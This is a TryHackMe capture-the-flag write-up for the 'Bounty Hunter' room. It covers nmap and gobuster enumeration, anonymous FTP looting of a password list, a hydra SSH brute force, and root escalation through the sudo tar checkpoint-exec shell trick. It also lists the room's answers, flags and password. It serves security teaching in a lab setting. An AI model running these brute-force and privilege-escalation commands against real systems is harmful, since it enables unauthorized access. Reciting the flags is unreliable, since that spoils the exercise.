

# Bounty Hunter - TryHackMe Writeup

This is a writeup for the "Bounty Hunter" challenge on TryHackMe, you can find [here](https://tryhackme.com/room/cowboyhacker). 

---



## Steps

### 1. Deploy the Machine
- Deployed the machine via TryHackMe .

### 2. Find Open Ports
- Scanned the target with `nmap`:
  ```bash
  nmap -A -sV -p- [VICTIM IP]
  ```
- Example:
  ```bash
  nmap -A -sV -p- 10.10.6.18
  ```
- Flags explained:
  - `-A`: Aggressive scan (OS detection, version detection, scripts, traceroute).
  - `-sV`: Detect service versions.
  - `-p-`: Scan all 65,535 ports.
- Results:
  ```
  PORT   STATE SERVICE VERSION
  21/tcp open  ftp     vsftpd 3.0.3 (ANONYMOUS logging enabled)
  22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
  80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
  ```
- Open ports: 3 (21, 22, 80).

### 3. Web Enumeration
- Ran `gobuster` to find directories:
  ```bash
  gobuster dir -u http://[VICTIM IP] -w [WORDLIST PATH]
  ```
- Example:
  ```bash
  gobuster dir -u http://10.10.6.18 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
  ```
- Flags explained:
  - `dir`: Directory enumeration mode.
  - `-u`: Target URL.
  - `-w`: Wordlist path.
- Results:
  ```
  /images        (Status: 301)
  /server-status (Status: 403)
  ```
- nothing interesting but still checked manually `http://[VICTIM IP]` .. and still nothing

### 4. Explore FTP
- Connected to FTP with anonymous login (from the nmap scan):
  ```bash
  ftp [VICTIM IP]
  ```
- Used `ls` (FTP command: `dir` works too) and found two files: `task.txt` and `locks.txt`.
- Downloaded them:
  ```bash
  get task.txt
  get locks.txt
  ```
- Read `task.txt`:
  ```bash
  cat task.txt
  ```
- Output:
  ```
  1.) Protect Vicious.
  2.) Plan for Red Eye pickup on the moon.
  -lin
  ```
- Author: `lin`.
- Read `locks.txt`:
  ```bash
  cat locks.txt
  ```
- Output: A list of passwords (e.g., `RedDr4gonSynd1cat3`, `rEDdrAGOnSyNDiCat3`).

### 5. Brute-Force SSH
- Identified SSH as a brute-forceable service from the `nmap` scan (port 22).
- Used `hydra` with the `locks.txt` password list:
  ```bash
  hydra -l lin -P locks.txt [VICTIM IP] ssh
  ```
- Example:
  ```bash
  hydra -l lin -P locks.txt 10.10.6.18 ssh
  ```
- Flags explained:
  - `-l`: Single username (`lin` from `task.txt`).
  - `-P`: Password list file.
- Output:
  ```
  [22][ssh] host: 10.10.6.18  login: lin   password: RedDr4gonSynd1cat3
  ```
- Service: `ssh`.
- Password: `RedDr4gonSynd1cat3`.

### 6. Gain User Access
- Logged in via SSH:
  ```bash
  ssh lin@[VICTIM IP]
  ```
- Example:
  ```bash
  ssh lin@10.10.6.18
  ```
- Entered password `RedDr4gonSynd1cat3` and landed in:
  ```
  lin@bountyhacker:~/Desktop$
  ```
- Checked identity:
  ```bash
  id
  ```
- Output: `uid=1001(lin) gid=1001(lin) groups=1001(lin)`
- Listed files:
  ```bash
  ls
  ```
- Found `user.txt` and read it:
  ```bash
  cat user.txt
  ```
- Content: `THM{CR1M3_SyNd1C4T3}`

### 7. Privilege Escalation
- Searched for SUID binaries:
  ```bash
  find / -user root -perm /4000 2>/dev/null
  ```
- No unusual results, so checked `sudo` privileges:
  ```bash
  sudo -l
  ```
- Entered password `RedDr4gonSynd1cat3`:
  ```
  User lin may run the following commands on bountyhacker:
      (root) /bin/tar
  ```
- Found `/bin/tar` could be run as root. Visited [GTFOBins](https://gtfobins.github.io/gtfobins/tar/) and used:
  ```bash
  sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
  ```
- Flags explained:
  - `-cf`: Create a tar file (`/dev/null` as dummy output).
  - `--checkpoint=1`: Trigger an action every 1 record.
  - `--checkpoint-action=exec=/bin/sh`: Execute `/bin/sh` when checkpoint is hit.
- Got a root shell:
  ```bash
  '# id'
  ```
- Output: `uid=0(root) gid=0(root) groups=0(root)`

### 8. Find Root Flag
- Searched for `root.txt`:
  ```bash
  '# find -name "root.txt" 2>/dev/null'
  ```
- Output: `./root/root.txt`
- Read it:
  ```bash
  '# cat /root/root.txt'
  ```
- Content: `THM{80UN7Y_h4cK3r}`

---

## Answers to Challenge Questions
1. **Who wrote the task list?**: `lin`
2. **What service can you brute-force with the text file found?**: `ssh`
3. **What is the user’s password?**: `RedDr4gonSynd1cat3`
4. **user.txt**: `THM{CR1M3_SyNd1C4T3}`
5. **root.txt**: `THM{80UN7Y_h4cK3r}`

---

## Tools Used
- `nmap`: Port and service enumeration.
- `gobuster`: Web directory enumeration.
- `ftp`: File retrieval.
- `hydra`: SSH brute-forcing.
- `ssh`: Remote login.
- [GTFOBins](https://gtfobins.github.io/): Privilege escalation guide.

---

## Lessons Learned
- Anonymous FTP can leak critical files like password lists.
- Brute-forcing with `hydra` is effective with a targeted wordlist.
- Checking `sudo -l` is a quick way to find privilege escalation paths.
- `tar` as a `sudo`-able command can spawn a root shell via GTFOBins.

---


